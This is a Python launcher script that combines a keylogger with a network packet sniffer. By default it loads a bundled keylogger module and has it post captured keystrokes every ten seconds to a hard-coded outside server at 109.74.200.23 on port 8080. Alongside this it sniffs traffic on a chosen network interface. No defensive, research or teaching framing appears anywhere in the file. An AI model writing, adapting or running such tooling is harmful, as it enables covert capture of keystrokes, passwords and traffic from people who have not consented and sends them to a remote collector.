import argparse
import importlib.util
import sys
import time
from pathlib import Path

from core.packet_sniffer import PacketSniffer


def load_keylogger():
    base_dir = Path(__file__).parent
    klgr_path = base_dir / "python-klgr-main" / "klgr.py"
    spec = importlib.util.spec_from_file_location("klgr_module", str(klgr_path))
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module.KeyLogger


def print_packet(data):
    print(data)


def main():
    parser = argparse.ArgumentParser(description="Merged keylogger + packet sniffer")
    parser.add_argument("--interface", help="Network interface to sniff")
    parser.add_argument("--host", default="109.74.200.23", help="Keylogger server host")
    parser.add_argument("--port", type=int, default=8080, help="Keylogger server port")
    parser.add_argument("--interval", type=int, default=10, help="Keylogger POST interval in seconds")
    parser.add_argument("--keylogger-only", action="store_true", help="Run only the keylogger")
    parser.add_argument("--sniffer-only", action="store_true", help="Run only the packet sniffer")
    args = parser.parse_args()

    if args.keylogger_only and args.sniffer_only:
        parser.error("Cannot use --keylogger-only and --sniffer-only together")

    do_keylogger = args.keylogger_only or not args.sniffer_only
    do_sniffer = args.sniffer_only or not args.keylogger_only

    keylogger = None
    sniffer = None

    try:
        if do_keylogger:
            KeyLogger = load_keylogger()
            keylogger = KeyLogger(host=args.host, port=args.port, interval=args.interval)
            keylogger.start()
            print(f"Keylogger started, posting to http://{args.host}:{args.port} every {args.interval} seconds")

        if do_sniffer:
            sniffer = PacketSniffer(callback=print_packet)
            sniffer.start(args.interface)
            iface_text = args.interface or "default interface"
            print(f"Packet sniffer started on {iface_text}")

        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Stopping tools...")
    finally:
        if keylogger:
            keylogger.stop()
        if sniffer:
            sniffer.stop()


if __name__ == "__main__":
    main()
